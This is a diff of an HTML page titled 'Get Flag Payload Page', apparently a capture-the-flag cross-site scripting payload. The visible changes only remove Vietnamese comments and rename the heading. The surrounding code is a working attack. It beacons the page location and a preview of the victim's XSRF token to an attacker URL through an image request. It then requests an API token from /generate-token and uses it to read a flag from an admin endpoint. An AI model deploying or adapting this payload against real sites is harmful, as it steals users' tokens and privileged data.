@@ -11,15 +11,12 @@
             var loc = window.location.href;
 
             function sendPing(data) {
-                // Quay lại dùng GET để tránh preflight request
                 var params = new URLSearchParams();
                 params.append("source_tag", "name:description_GET_FLAG_V3");
                 for (var key in data) {
                     let val_str = String(data[key]);
-                    // Không giới hạn độ dài, nhưng encode để tránh lỗi ký tự đặc biệt
                     params.append(key, encodeURIComponent(val_str));
                 }
-                // Sử dụng Image để gửi GET request
                 new Image().src = attacker_url + "?" + params.toString();
             }
 
@@ -50,7 +47,6 @@
 
             sendPing({ stage: "script_start_get_flag", loc: loc, xsrf_preview: xsrfTokenValue.substring(0,20) });
 
-            // Bước 1: Lấy API Token
             fetch("/generate-token", {
                 method: "POST",
                 headers: {
@@ -78,7 +74,6 @@
                         user_name: data.user ? data.user.name : "N/A"
                     });
 
-                    // Bước 2: Dùng API Token để lấy FLAG_2
                     return fetch("/api/admin/sup3rs3cr3t", {
                         method: "GET",
                         headers: {
@@ -119,6 +114,6 @@
     </script>'>
 </head>
 <body>
-    <h1>Get Flag Payload Page</h1>
+    <h1>Get Flag Payload Page2</h1>
 </body>
 </html>
